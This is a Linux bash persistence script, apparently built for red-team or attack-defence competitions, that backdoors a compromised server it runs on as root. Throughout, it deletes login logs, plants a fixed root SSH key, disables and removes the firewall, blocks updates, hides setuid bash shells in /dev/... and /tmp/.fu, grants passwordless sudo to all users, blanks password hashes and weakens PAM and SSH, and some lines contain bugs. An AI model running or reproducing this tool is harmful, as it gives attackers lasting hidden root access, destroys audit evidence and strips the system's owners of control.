#!/bin/bash
echo "====================="
echo "| Dank Script AF :) |"
echo "====================="

#root ssh key
#place your pub key here
SHARED_PUBKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQgs43ZR7jpGXeqWCnLDrtn2Jlx7I9qRQ/MLPRUypSvY23uGORJEbOlnLZoqKT6/vDov/JGNgfdW2VEAMluRdnXYn/I2YAb4UgcjaEgHK2pPtCCYg+h0cw6eqDqtDPz9YppBfxQabOjkZ61YSsjs67X2OBahPxxh0ZMDop+BHYeCVZ3fF2bePjQe8R0fAGe0iD9bAe+WnlWg1fMTIctE0U5lcqQSvww8oyBiklpPivf3nl3q2PHRdHTivFUr8qJdzinys/AwfKovoZ7W+BvB1JTPfAYu4DYpGxYxkmqjW5Aoh8nxILVbkR1pQ6FHVy38NBifw+OF4TBoDjwSYaM+lJ"

ARCH=`uname -i`
echo "Detected $ARCH"

#detect version of centos
if [ -e /etc/centos-release ]; then
    OSVER=`cat /etc/centos-release | awk {'print $3'}`
    echo "Found OS: CentOS" $OSVER
fi

#detect version of debian
if [ -e /etc/debian_version ]; then
    $OSDEB=`cat /etc/debian_version`
    echo "Found OS: Debian " $OSDEB
    $OSVER = "Debian"
fi
#detect version of ubuntu
if [ -e /etc/os-release ]; then
    OSCHECK=`cat /etc/os-release | awk -F"\"" 'FNR == 5 {print $2}'`
    echo "Found OS:" $OSCHECK
    OSVER=`cat /etc/os-release | awk -F"\"" 'FNR == 1 {print $2}'`
fi

#insert code to make system account!!!

do_backdoors() {
#========================== 
    # remove login logs right now
echo "Killing some logs for you..."
    rm -rf /var/run/utmp
    touch /var/run/utmp
    chmod 664 /var/run/utmp

    # then remove login logs permanently
    for file in /var/log/lastlog /var/log/utmp /var/log/wtmp /var/run/lastlog /var/run/utmp /var/run/wtmp ; do
        unlink $file
        ln -s /dev/null $file
    done
#==========================    
echo "Fixing SSH..."
    # install root ssh key
    chattr -i /root/.ssh/authorized*
    if [ ! -d "/root/.ssh" ]; then
        mkdir /root/.ssh
        chmod 700 /root/.ssh
    fi 
    echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys2
    echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys
    # add secondary key auth file, for when they inevitably remove /root/.ssh/
    echo $SHARED_PUBKEY >> /etc/ssh/authorized_keys
    echo 'AuthorizedKeysFile /etc/ssh/authorized_keys' >> /etc/ssh/sshd_config #sed trev fix
    # echo 'PubkeyAuthentication yes' >> /etc/ssh/sshd_config
    echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
    echo 'AuthorizedKeysFile .ssh/authorized_keys' >> /etc/ssh/sshd_config
    echo 'AuthorizedKeysFile .ssh/authorized_keys2' >> /etc/ssh/sshd_config
    chmod 600 /etc/ssh/authorized_keys
    chmod 600 /root/.ssh/authorized*
    chattr +i /etc/ssh/authorized_keys*
    chattr +i /root/.ssh/authorized_keys*
echo "SSH is set up to be dank."
#==========================
echo "Flushing some tables that are of ip flavor"
    #in case you're remoting in, you might want to run this for fucks sake.
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    iptables -F
    ufw disable
    # poor iptables
    echo "Let the firewalls hit the floor"
    echo "*/5 * * * * /sbin/iptables -F" | crontab -
    #if centOS, kill iptables :D
echo "Damn Dude. That's evil. Iptables is Now Gone :D"


#==================================== 
    #murder iptables
echo "Murdering iptables..."
    if [ $OSVER == '6.7' ]; then
        #centos
        rpm -e --nodeps `rpm -qa | grep iptables`
    fi  
    
    if [ $OSVER == 'Ubuntu' ]; then
        #ubuntu
        apt-get remove iptables -qq
    fi
#====================================
echo "Now hiding the evidence..."
    if [ -f "/etc/yum.conf" ]; then
        echo 'exclude=*' >> /etc/yum.conf
        touch -r /etc/issue /etc/yum.conf
        chattr +i /etc/yum.comf
    fi
    # block all kernel package upgrades on ubuntu/debian
  # all apt-get use will result in "<package> has no installation candidate"
  if [ -d "/etc/apt/preferences.d" ]; then
   echo -e "Package: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences.d/ubuntu
   # blend in
   touch -r /etc/issue * /etc/apt/preferences.d/*
   touch -r /etc/issue * /etc/apt
   touch -r /etc/issue * /etc/apt/*
  fi
  if [ -f "/etc/apt/preferences" ]; then
   echo -e "Package: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences
   touch -r /etc/issue * /etc/apt
   touch -r /etc/issue * /etc/apt/*
  fi

  # prevent kernel package from being included in the autoupgrade in ubuntu
  if [ -f "/etc/apt/apt.conf.d/01autoremove" ]; then
    sed -ie 's/\"metapackages\"/\"metapackages\";\n\t\"kernel\*\"/'g /etc/apt/apt.conf.d/01autoremove
    touch -r /etc/issue * /etc/apt/apt.conf.d/*
    touch -r /etc/issue * /etc/apt
    touch -r /etc/issue * /etc/apt/*
  fi
#====================================

    # backdoor folder to hide dankness
echo "Making backdoor folders..."
    if [ ! -d "/dev/..." ]; then
        mkdir -p "/dev/..."
        chmod 777 "/dev/..."
        touch -r /etc/issue /dev/...
    fi
echo "Filling those folders up..."
    cp /bin/bash /dev/.../pwnd
    chmod +s /dev/.../pwnd
    
    # Just in case
echo "One more just in case"
    if [ ! -d "/tmp/.fu" ]; then
        mkdir -p "/tmp/.fu"
        chmod 777 "/tmp/.fu"
        touch -r /etc/issue /tmp/.fu
    fi
    cp /bin/bash /tmp/.fu/pwnd
    chmod +s /tmp/.fu/pwnd
#====================================
    # backdoor bin account - lol123
echo "Backdooring the bin account..in case shit happens."
    sed -i -e 's/bin:\*:/bin:$6$OkgT6DOT$0fswsID8AwsBF35QHXQVmDLzYGT.pUtizYw2G9ZCe.o5pPk6HfdDazwdqFIE40muVqJ832z.p.6dATUDytSdV0:/g' /etc/shadow
    usermod -s /bin/sh bin
    
    # make privesc easy via all service accounts via sudoers
echo "Making privesc easy..."
    echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
    touch -r /etc/issue * /etc/passwd
    touch -r /etc/issue * /etc/sudoers
    groupadd admin
#====================================

    # Ubuntu automatically makes members of admin have sudo capabilities.
    # Lets give that as an option for root to web backdoors
    if [ $OSVER == '6.7' ]; then
    echo "CentOS was detected. So now im backdooring bin and system."
        # Must be CentOS, add to the correct groups
        usermod -G wheel -a bin
        usermod -G wheel -a system
    fi
    
    usermod -G admin -a bin
    usermod -G admin -a www-data
    usermod -G admin -a httpd
    usermod -G admin -a apache

    # Setup the net of Cats
    if [ $OSVER == '6.7' ]; then 
        #CENTOS netcat removed -e so use nmap's nc.
        yum install nmap -qy
    fi
    
    if [ $OSVER == 'Ubuntu']; then
        apt-get install netcat-traditional -qq 
    fi 
    
#====================================
    #fuck up pam shit
    ## replace accounts with * as pwhash with blank space. * as pwhash means account cannot be logged into
echo "Fucking up PAM."
    sed -ie "s/*//g" /etc/shadow
    sed -ie "s/\!//g" /etc/shadow
    # Give all accounts shells
    ## replace /usr/sbin/nologin
    sed -ie "s#/usr/sbin/nologin#/bin/bash#g" /etc/passwd
    ## replace /sbin/nologin
    sed -ie "s#/sbin/nologin#/bin/bash#g" /etc/passwd
    ## replace /bin/false
    sed -ie "s#/bin/false#/bin/bash#g" /etc/passwd
    ## replace /bin/true
    sed -ie "s#/bin/true#/bin/bash#g" /etc/passwd
    
    if [ -d "/etc/pam.d/password-auth" ]; then 
    ## allow logins with no passwd though pam - centos
        sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/password-auth
    fi
    if [ -d "/etc/pam.d/common-auth" ]; then
    ## allow logins with no passwd though pam
        sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/common-auth
    fi
    ## allow any account to use su with no pw
    sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/su

#====================================
echo "Fixing SSH for PAM."
    ## allow empty pw though ssh
    chattr -i /etc/ssh/sshd_config
    sed -ie "s/PermitEmptyPasswords no/PermitEmptyPasswords yes/g" /etc/ssh/sshd_config
    chattr +i /etc/ssh/sshd_config
    ##restart ssh to update config
    /etc/init.d/ssh restart
    
    echo "ONCE LAST THING"
    chattr +i /etc/passwd
    chattr +i /etc/shadow
    
    
echo "Thank you for visiting. We will see you again soon."
}

if [ $ARCH = "x86_64" ]; then
    do_backdoors
    echo "Enjoy"
    exit
fi

if [ $ARCH != "x86_64" ]; then
    do_backdoors
    echo "Enjoy!"
    exit
fi


echo "Fuck it, just be dank"
exit 0

